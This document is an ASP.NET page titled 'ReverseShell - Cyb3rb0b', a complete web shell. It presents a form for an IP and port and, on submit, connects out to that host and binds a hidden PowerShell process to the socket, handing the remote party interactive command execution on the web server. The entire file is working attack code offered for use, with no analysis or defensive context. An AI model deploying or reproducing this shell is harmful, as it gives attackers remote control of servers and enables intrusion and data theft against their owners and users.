<%@ Page Language="C#" Debug="true" Trace="false" %>

<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.ComponentModel" %>
<%@ Import Namespace="System.Linq" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Threading" %>


<html>
    <head>
        <title>ReverseShell - Cyb3rb0b</title>
    </head>
    <script language="c#" runat="server">
        static StreamWriter streamWriter;

        protected void Button1_Click(object sender, System.EventArgs e){
          

            this.Connect();
        }

        void Connect(){

            using(TcpClient client = new TcpClient(this.txtIp.Text, int.Parse(this.txtPort.Text)))
            {
                using(Stream stream = client.GetStream())
                {
                    using(StreamReader rdr = new StreamReader(stream))
                    {
                        streamWriter = new StreamWriter(stream);

                        StringBuilder strInput = new StringBuilder();

                        Process p = new Process();
                        p.StartInfo.FileName = "powershell.exe";
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                        p.Start();
                        p.BeginOutputReadLine();

                        while(true)
                        {
                            strInput.Append(rdr.ReadLine());
                            //strInput.Append("\n");
                            p.StandardInput.WriteLine(strInput);
                            strInput.Remove(0, strInput.Length);
                        }
                    }
                }
            }
        }

        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

        </script>
    <body>
        <form id="form" runat="server">
            <table>
                <tr>
                    <td>
                        IP
                    </td>
                    <td>
                        <asp:TextBox ID="txtIp" runat="server"></asp:TextBox>
                    </td>
                </tr>
                <tr>
                    <td>
                        Port
                    </td>
                    <td>
                        <asp:TextBox ID="txtPort" runat="server"></asp:TextBox>
                    </td>
                </tr>
                <tr>
                    <td colspan="2">
                        <asp:Button ID="Button1" runat="server" Text="Connect" OnClick="Button1_Click" />
                    </td>
                </tr>
            </table>
            
        </form>

    </body>
</html>